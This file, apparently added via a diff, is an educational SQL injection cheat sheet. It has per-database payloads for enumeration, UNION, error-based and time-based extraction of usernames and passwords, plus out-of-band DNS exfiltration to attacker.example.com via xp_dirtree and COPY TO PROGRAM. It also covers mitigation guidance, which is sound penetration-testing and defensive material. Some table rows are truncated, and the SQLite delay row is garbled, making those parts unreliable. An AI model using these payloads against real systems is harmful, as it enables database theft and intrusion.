@@ -1,0 +1,486 @@
+SQL Injection Cheat Sheet 2025
+
+Disclaimer: This cheat sheet is for defensive learning and for use in authorized penetration testing or lab environments only. It aggregates syntax used to probe and enumerate databases when an application incorrectly concatenates untrusted input into SQL queries. Never attempt these techniques against systems without explicit permission. Always follow your organization’s responsible disclosure policies, and focus on mitigation (prepared statements, input validation, least‑privilege accounts) in production environments.
+cheatsheetseries.owasp.org
+.
+
+What is SQL injection?
+
+SQL injection (SQLi) is a vulnerability that occurs when an application concatenates user‑controlled data into a SQL statement without proper parameterization. An attacker can inject SQL tokens to manipulate or append their own queries, potentially bypassing authentication, reading or modifying data, or executing OS‑level commands if the database supports them. SQLi variants include in‑band (data returned directly), error‑based (using verbose errors), blind/boolean (inferring data from true/false responses), time‑based (measuring delays), and out‑of‑band (OOB) (using network side‑effects).
+
+Ethics and legal considerations
+
+Only use these techniques in a controlled environment or with explicit authorization. Unauthorized SQLi activity is illegal and unethical. If you discover a vulnerability, follow a responsible disclosure process. Always prefer mitigation over exploitation.
+
+1 String operations
+
+Many SQLi payloads rely on manipulating or concatenating strings. Different database engines implement string functions differently, so you need to tailor your queries accordingly.
+
+1.1 String concatenation
+
+Use concatenation operators or functions to join values or build messages. This is useful when you want to retrieve multiple values in a single column (for example, combining the username and password fields) or when building payloads.
+
+Database	Syntax	Notes
+Oracle	`'foo'	
+SQL Server	'foo'+'bar'	Uses the + operator for strings. It can also be used on numeric types.
+PostgreSQL	`'foo'	
+MySQL	'foo' 'bar' (note the space) or CONCAT('foo','bar')	MySQL treats adjacent quoted strings separated by a space as concatenated; CONCAT() works on any number of arguments
+portswigger.net
+.
+SQLite	`'foo'	
+Others	CONCAT_WS(separator, arg1, …) (MySQL), LISTAGG() (Oracle) and STRING_AGG() (PostgreSQL) aggregate multiple rows into a single string.	
+1.2 Extracting substrings
+
+The SUBSTRING/SUBSTR family of functions returns a portion of a string starting at a specific offset. Offsets are generally 1‑based (the first character is position 1).
+
+Database	Syntax	Example
+Oracle	SUBSTR('foobar', 4, 2)	Returns ba
+portswigger.net
+. Oracle also provides SUBSTRB() to operate on bytes.
+SQL Server	SUBSTRING('foobar', 4, 2)	Returns ba
+portswigger.net
+. SUBSTRING works on text, binary and other data types.
+PostgreSQL	SUBSTRING('foobar', 4, 2)	Equivalent to SUBSTR(). You can also use LEFT(), RIGHT() or substr().
+MySQL	SUBSTRING('foobar', 4, 2) or SUBSTR('foobar', 4, 2)	Returns ba
+portswigger.net
+. MySQL also supports LEFT(str, len) and RIGHT(str, len).
+SQLite	SUBSTRING('foobar', 4, 2) or SUBSTR('foobar', 4, 2)	Both functions return ba; they are case‑insensitive.
+1.3 Comments
+
+Comment tokens are used to truncate the remainder of the original query. This allows you to inject your own logic and ignore trailing syntax. The correct comment marker depends on the database engine.
+
+Database	Comment syntax
+Oracle	--comment (double dash) or /* comment */
+SQL Server	--comment or /* comment */
+PostgreSQL	--comment or /* comment */
+MySQL	#comment or -- comment (note the space after the double dash) or /* comment */
+portswigger.net
+.
+SQLite	-- comment or /* comment */.
+
+Comments are often appended after an injected payload to neutralize the remainder of the query.
+
+2 Database enumeration
+
+When exploiting SQLi, you often need to enumerate the database type, version, schema, tables, columns and users. The following sections present safe queries for enumeration across common database engines. Use them only in controlled environments.
+
+2.1 Determine database type and version
+
+To craft effective payloads, you must first identify the DBMS. You can inject provider‑specific queries and see which one returns results. A few common queries:
+
+Database	Query
+SQL Server	SELECT @@version
+portswigger.net
+
+MySQL	SELECT @@version
+portswigger.net
+
+Oracle	SELECT * FROM v$version
+portswigger.net
+
+PostgreSQL	SELECT version()
+portswigger.net
+
+SQLite	SELECT sqlite_version()
+
+These queries can be run directly or via a UNION injection to infer the DBMS from the returned string. For example, ' UNION SELECT @@version-- may reveal the exact version of SQL Server in the response
+portswigger.net
+.
+
+2.2 List databases (or schemas)
+
+After identifying the DBMS, you can list databases or schemas. In some systems, the information schema provides metadata; Oracle uses data dictionary views; SQLite uses a single file.
+
+Database	Query	Notes
+MySQL	SELECT schema_name FROM information_schema.schemata
+pentestmonkey.net
+	Lists all databases (requires at least read privileges).
+SQL Server	SELECT name FROM master..sysdatabases
+pentestmonkey.net
+	Returns names of databases. You can also loop DB_NAME(N) for N = 0,1,2,…
+pentestmonkey.net
+.
+PostgreSQL	SELECT datname FROM pg_database
+pentestmonkey.net
+	Shows all databases in the cluster.
+Oracle	SELECT DISTINCT owner FROM all_tables
+swisskyrepo.github.io
+	Owners correspond to schemas.
+SQLite	SQLite stores all tables in a single file; there are no multiple databases. You can inspect the file directly.	
+2.3 List tables
+Database	Query	Notes
+MySQL	SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
+pentestmonkey.net
+	Lists tables in user‑defined schemas.
+SQL Server	SELECT name FROM master..sysobjects WHERE xtype = 'U'
+pentestmonkey.net
+	Lists user tables in the master database. Replace master with another database name for other schemas.
+PostgreSQL	SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog','pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)
+pentestmonkey.net
+	Lists visible tables.
+Oracle	SELECT table_name FROM all_tables and SELECT owner, table_name FROM all_tables
+swisskyrepo.github.io
+	all_tables contains tables accessible to the current user.
+SQLite	SELECT tbl_name FROM sqlite_master WHERE type='table'
+swisskyrepo.github.io
+	Lists tables; exclude names starting with sqlite_ to ignore internal tables.
+2.4 List columns and data types
+Database	Query	Notes
+MySQL	SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema NOT IN ('mysql','information_schema')
+pentestmonkey.net
+	Lists all columns across schemas. Filter by table_name to target a specific table.
+SQL Server	SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name='mytable')
+pentestmonkey.net
+	Lists column names for mytable. To include types, join syscolumns with sysobjects and call TYPE_NAME(syscolumns.xtype)
+pentestmonkey.net
+.
+PostgreSQL	SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public')
+pentestmonkey.net
+	Lists columns in visible tables. Replace public with another schema if needed.
+Oracle	SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE' and SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
+swisskyrepo.github.io
+	Retrieves column names and types.
+SQLite	SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name') or SELECT name FROM PRAGMA_TABLE_INFO('table_name')
+swisskyrepo.github.io
+	Returns column names for a given table.
+2.5 List users (authentication accounts)
+
+Listing database user accounts often requires higher privileges. Use these queries only where permitted.
+
+Database	Query	Notes
+MySQL	SELECT user FROM mysql.user
+pentestmonkey.net
+	Returns usernames (requires administrative rights). Password hashes are stored in mysql.user and may require SELECT privileges
+pentestmonkey.net
+.
+SQL Server	SELECT name FROM master..syslogins
+pentestmonkey.net
+	Lists login names. Password hashes are stored in sysxlogins or sys.sql_logins (privileged)
+pentestmonkey.net
+.
+PostgreSQL	SELECT usename FROM pg_user
+pentestmonkey.net
+	Lists users. Password hashes reside in pg_shadow (requires superuser access)
+pentestmonkey.net
+.
+Oracle	SELECT username FROM all_users
+swisskyrepo.github.io
+	Returns all database users.
+SQLite	SQLite does not maintain user accounts; access control is handled by file permissions.	
+2.6 List privileges and roles
+
+Understanding privileges helps identify accounts with elevated rights. Example queries (privileged):
+
+MySQL: SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges
+pentestmonkey.net
+ lists global privileges; information_schema.schema_privileges and information_schema.column_privileges provide database‑ and column‑level privileges.
+pentestmonkey.net
+.
+
+SQL Server: SELECT permission_name FROM master..fn_my_permissions(NULL, 'DATABASE') lists current privileges on the database; fn_my_permissions(NULL, 'SERVER') lists server‑level permissions
+pentestmonkey.net
+.
+
+PostgreSQL: SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user shows whether each user can create databases or has superuser privileges
+pentestmonkey.net
+.
+
+Oracle: Use roles and dba_role_privs to list privileges (requires admin privileges).
+
+3 Error‑based SQL injection
+
+Error‑based SQLi uses database error messages to infer data. You supply a payload that triggers an error containing the data you want to extract. Consider the following patterns:
+
+3.1 Conditional errors
+
+You can test a boolean condition and deliberately trigger an error if the condition is true. This technique is useful when the application returns verbose database errors.
+
+Database	Payload (conceptual)	Explanation
+Oracle	SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+portswigger.net
+	Dividing by zero causes an error when the condition is true.
+SQL Server	SELECT CASE WHEN (condition) THEN 1/0 ELSE NULL END
+portswigger.net
+	Triggers a divide‑by‑zero error if the condition holds.
+PostgreSQL	1 = (SELECT CASE WHEN (condition) THEN 1/(SELECT 0) ELSE NULL END)
+portswigger.net
+	Causes a division error.
+MySQL	SELECT IF(condition,(SELECT table_name FROM information_schema.tables),'a')
+portswigger.net
+	Attempts to return a table name if the condition is true; otherwise returns 'a'.
+3.2 Extracting data via visible error messages
+
+If an application returns detailed error messages, you can embed secret values in operations that raise type or conversion errors. For example:
+
+SQL Server: Inject SELECT 'foo' WHERE 1 = (SELECT 'secret') to cause a type conversion error; the error message may include the literal 'secret'
+portswigger.net
+.
+
+PostgreSQL: SELECT CAST((SELECT password FROM users LIMIT 1) AS int) causes an invalid integer cast; the error message includes the text of the password
+portswigger.net
+.
+
+MySQL: SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) triggers an XPath error containing the secret string
+portswigger.net
+.
+
+These techniques can leak sensitive information, so secure applications should suppress or sanitize database errors.
+
+4 Stacked (batched) queries
+
+Stacked queries (also called query batching) let you append additional statements to an existing query. This is primarily useful against blind SQLi where you cannot see query results but can cause side effects (for example, using a second query to trigger a DNS lookup or time delay). The syntax differs across DBMSs:
+
+Database	Support	Syntax
+Oracle	Not supported	Oracle does not allow multiple statements in a single query.
+SQL Server	Supported	Separate queries with ; or just a space: QUERY1; QUERY2
+portswigger.net
+.
+PostgreSQL	Supported	Use ; to separate statements: QUERY1; QUERY2
+portswigger.net
+.
+MySQL	Partial	Batched queries are not always possible; certain drivers (PHP’s mysqli::multi_query() or Python’s MySQLdb) allow multi‑statements. Separate queries with ;
+portswigger.net
+.
+
+If multi‑statement execution is enabled, you can follow an injection with a statement that causes a DNS request or a time delay. Many modern libraries disable multi‑statement queries by default.
+
+5 Time‑based SQL injection
+
+Time delays allow you to infer information from the timing of the server’s response. In a blind scenario where no data is returned, you can embed a time‑delay function that executes only if a condition is true. Observe the response time to deduce the result.
+
+5.1 Unconditional time delays
+
+These functions pause execution for a specified duration:
+
+Database	Delay function	Example
+Oracle	dbms_pipe.receive_message(('a'),10)
+portswigger.net
+	Pauses for 10 seconds.
+SQL Server	WAITFOR DELAY '0:0:10'
+portswigger.net
+	Waits 10 seconds.
+PostgreSQL	SELECT pg_sleep(10)
+portswigger.net
+	Waits 10 seconds.
+MySQL	SELECT SLEEP(10)
+portswigger.net
+	Waits 10 seconds. Versions before 5.0.12 may not support SLEEP().
+SQLite	SELECT pg_sleep(10) is unavailable. You can sometimes induce CPU‑heavy functions (RANDOMBLOB) as a delay
+swisskyrepo.github.io
+.	
+5.2 Conditional time delays
+
+You can embed a boolean test and trigger a delay when the condition holds:
+
+Database	Payload (conceptual)	Explanation
+Oracle	`SELECT CASE WHEN (condition) THEN 'a'	
+SQL Server	IF (condition) WAITFOR DELAY '0:0:10'
+portswigger.net
+	Executes a delay if the condition holds.
+PostgreSQL	SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END
+portswigger.net
+	Sleeps only when the condition is true.
+MySQL	SELECT IF(condition,SLEEP(10),'a')
+portswigger.net
+	Sleeps for 10 seconds if the condition evaluates to true.
+SQLite	Use long computations: AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table') = '41' (no native sleep).	
+
+By measuring the response time, you can infer whether the condition was true (delay occurs) or false (no delay).
+
+6 UNION‑based SQL injection
+
+A UNION attack appends the results of a second SELECT query to the original query’s output. This technique is extremely useful when the application displays query results. However, two requirements must be met:
+
+Column count — both queries must return the same number of columns.
+
+Compatible data types — each corresponding column must have compatible data types.
+
+The general form is:
+
+SELECT a,b FROM table1 UNION SELECT c,d FROM table2
+
+6.1 Determining the number of columns
+
+Two common methods can help discover how many columns the original query returns
+portswigger.net
+:
+
+Incremental ORDER BY: Inject ORDER BY 1--, ORDER BY 2--, ORDER BY 3-- and so on until the database produces an error. The highest number that does not cause an error equals the number of columns. When the number exceeds the actual columns, the database returns an error such as “The ORDER BY position number 3 is out of range”
+portswigger.net
+.
+
+Incremental UNION SELECT NULL: Inject ' UNION SELECT NULL--, ' UNION SELECT NULL,NULL--, ' UNION SELECT NULL,NULL,NULL-- etc. When the number of NULL values matches the number of columns, the query succeeds; otherwise, it throws an error like “All queries combined using a UNION must have an equal number of expressions”
+portswigger.net
+. Using NULL ensures data type compatibility across columns
+portswigger.net
+.
+
+6.2 Finding columns that accept string data
+
+After determining the column count, identify which columns can hold text. Inject UNION SELECT 'a',NULL,... and move the string literal to each column in turn. When the injected string appears in the response, that column accepts strings
+portswigger.net
+.
+
+6.3 Retrieving data
+
+Once you know the column count and a suitable string column, you can extract data from arbitrary tables. Suppose the original query returns two columns and the vulnerable parameter is in a quoted context. You might use:
+
+' UNION SELECT username, password FROM users--
+
+
+This returns usernames and password hashes in the application’s response
+portswigger.net
+. If the query returns only one column, concatenate values using the appropriate operator: on Oracle, ' UNION SELECT username || '~' || password FROM users-- joins the two values with a tilde separator
+portswigger.net
+.
+
+6.4 Database‑specific tips
+
+Oracle: Each SELECT must include a FROM clause. Use the built‑in dual table when you need a dummy FROM clause: ' UNION SELECT NULL FROM dual--
+portswigger.net
+.
+
+MySQL: The double‑dash comment must be followed by a space (-- ). Alternatively, use # for single‑line comments
+portswigger.net
+.
+
+PostgreSQL: Use single quotes for strings; -- comments the remainder.
+
+SQL Server: Use + to concatenate strings; the comment marker is -- (no space needed).
+
+7 Boolean and blind SQL injection
+
+When no data is returned and errors are hidden, you can still infer information by modifying the query logic and observing differences in the HTTP response or timing:
+
+Boolean‑based (or content‑based) blind SQLi: Inject a condition that evaluates to true or false and observe whether the application’s output changes. For example, ' AND 1=1-- may return the normal page, whereas ' AND 1=2-- may return an empty result. By altering the condition (e.g., testing each bit of a character’s ASCII code), you can infer data bit‑by‑bit.
+
+Time‑based blind SQLi: Use conditional time delays (see Section 5.2) to infer data based on response time. This is effective when no visible output differences exist. For example, ' OR IF((SELECT SUBSTR(password,1,1)='a'), SLEEP(5), 0)-- will delay the response if the first character of the password is a. By iterating through possible characters and positions, you can reconstruct secret values.
+
+Blind SQLi is slower than in‑band techniques but often the only option on hardened applications. Always restrict automated attacks to authorized test systems.
+
+8 Out‑of‑band (OOB) and DNS exfiltration
+
+If network egress is allowed, you can ask the database to initiate a DNS lookup or HTTP request to an attacker‑controlled domain. The hostname can include data from the database, allowing data to be exfiltrated via DNS queries. Examples include:
+
+SQL Server: extended stored procedures such as xp_dirtree can perform UNC path lookups (e.g., exec master..xp_dirtree '//attacker.example.com/a')
+portswigger.net
+.
+
+Oracle: XML functions like EXTRACTVALUE() can resolve external entity references to remote URLs
+portswigger.net
+.
+
+PostgreSQL: With COPY TO PROGRAM you can execute nslookup (copy (SELECT '') to program 'nslookup attacker.example.com')
+portswigger.net
+.
+
+MySQL: On Windows, LOAD_FILE() or SELECT ... INTO OUTFILE against a UNC share can trigger a network connection
+portswigger.net
+.
+
+OOB techniques require high privileges and are usually blocked in secure configurations. Using them without authorization is illegal; they are included here to illustrate why egress filtering and proper privilege separation are crucial.
+
+9 Additional enumeration patterns and functions
+
+Beyond basic listing of tables and columns, databases provide many built‑in functions that attackers can misuse. Knowing them helps defenders recognize malicious patterns.
+
+9.1 Numeric and bitwise functions
+
+Bitwise operators can reveal information one bit at a time. For example, 6 & 2 returns 2, while 6 & 1 returns 0
+pentestmonkey.net
+.
+
+ASCII() or ORD() returns the numeric code for a character, and CHAR()/CHR() returns the character for a numeric code
+pentestmonkey.net
+pentestmonkey.net
+. These functions are widely used in blind SQLi to test individual characters.
+
+9.2 Avoiding quotes
+
+To bypass filters that block single quotes, attackers may use hexadecimal encoding or string functions:
+
+MySQL: 0x414243 yields ABC
+pentestmonkey.net
+; CHAR(65,66,67) returns ABC. The CONCAT() function can assemble characters.
+
+SQL Server: CHAR(0x41)+CHAR(0x42) returns AB
+pentestmonkey.net
+.
+
+PostgreSQL: CHR(65)||CHR(66) returns AB
+pentestmonkey.net
+.
+
+Oracle: CHR(65)||CHR(66) behaves similarly.
+
+9.3 CASE and IF statements
+
+Conditional logic can be embedded directly in SQL:
+
+MySQL: SELECT IF(1=1,'foo','bar') returns foo
+pentestmonkey.net
+. CASE expressions are also supported.
+
+SQL Server: IF (1=1) SELECT 1 ELSE SELECT 2 returns 1
+pentestmonkey.net
+.
+
+PostgreSQL/Oracle: SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END returns A
+pentestmonkey.net
+.
+
+9.4 Privilege escalation and command execution (dangerous)
+
+Some databases offer functions that execute OS‑level commands or load external libraries. Examples include xp_cmdshell on SQL Server
+pentestmonkey.net
+, dbms_java.runjava on Oracle
+swisskyrepo.github.io
+, and load_extension() in SQLite
+swisskyrepo.github.io
+. These capabilities are extremely powerful and should be disabled or restricted in production. Do not attempt them outside a safe lab.
+
+10 Mitigation and secure coding
+
+Understanding SQLi techniques is only half of the picture—preventing them is more important. Follow these best practices:
+
+Use parameterized queries and prepared statements: Always separate SQL code from data. Prepared statements force developers to define the SQL structure first and bind user input later; this ensures the database never treats user data as SQL code
+cheatsheetseries.owasp.org
+. Parameterized queries are simpler to write and safer than dynamic string concatenation
+cheatsheetseries.owasp.org
+.
+
+Use properly constructed stored procedures: Stored procedures can be safe if they only accept parameters and avoid building SQL with concatenation. However, poorly written procedures can introduce vulnerabilities
+cheatsheetseries.owasp.org
+.
+
+Allow‑list input validation: Validate user input against a whitelist of allowed values. For numeric identifiers, ensure the value is an integer; for strings, enforce patterns (e.g., email addresses) before using them in queries. Reject or sanitize unexpected input.
+
+Least privilege: Configure database accounts with only the permissions they require. An application should not connect using a DBA account. If the application is compromised, limiting privileges restricts what an attacker can do
+cheatsheetseries.owasp.org
+.
+
+Error handling and logging: Do not expose database errors to end users. Catch exceptions and return generic error pages. Log errors internally with relevant metadata so that suspicious activity can be detected. Turn off verbose error messages in production.
+
+Use ORM frameworks carefully: Object–relational mappers (ORMs) can reduce the risk of SQLi if used correctly. Avoid raw SQL queries or ensure that any raw query uses proper parameter binding.
+
+Regular security testing: Incorporate static analysis (SAST) and dynamic testing (DAST) into the development lifecycle. Automated scanners can detect many SQLi patterns, but manual code review is still essential.
+
+Network controls and monitoring: Restrict outbound connections from the database server to prevent OOB exfiltration. Monitor for unusual DNS queries or long running database sessions, which may indicate time‑based or blind SQLi attempts.
+
+Patching and configuration: Keep database software and drivers up to date. Disable unneeded features (e.g., xp_cmdshell, Java stored procedures, load_extension()), and enable input‑validation frameworks.
+
+11 Responsible testing workflow
+
+Obtain authorization for any penetration testing. Document the scope and any test accounts provided.
+
+Identify injection points by sending harmless payloads (e.g., ' OR '1'='1), monitoring for error messages or behavioral changes.
+
+Determine DBMS type using version queries (Section 2.1).
+
+Enumerate the schema (Section 2.2–2.4) using safe SELECT queries. Avoid destructive actions.
+
+Only proceed to advanced techniques (error‑based, time‑based, OOB) if authorized and necessary. Use them judiciously.
+
+Report findings with proof of concept payloads and mitigation advice. Do not extract or disclose sensitive data beyond what is needed to demonstrate the vulnerability.
+
+Work with developers and DBAs to remediate the issue by implementing prepared statements, input validation, and proper error handling
